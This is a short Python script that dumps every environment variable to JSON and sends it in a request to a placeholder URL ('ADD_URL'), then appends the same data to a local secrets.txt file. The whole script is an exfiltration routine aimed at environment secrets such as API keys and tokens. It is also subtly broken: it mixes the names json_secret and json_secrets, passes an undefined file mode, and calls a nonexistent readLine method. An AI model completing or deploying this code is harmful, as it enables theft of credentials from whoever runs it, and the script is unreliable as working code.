import os
import json
import requests

secrets = dict(os.environ)
json_secret = json.dumps(secrets)

#print(json_secrets)
#print(secrets)

response = requests.get('ADD_URL', data = json_secrets)

#print(response.request.url)
print(response.status_code)

with open("secrets.txt", "a") as file:
    file.write(json_secrets)

with open("secrets.txt", r) as file:
    line = file.readLine()

print(line)
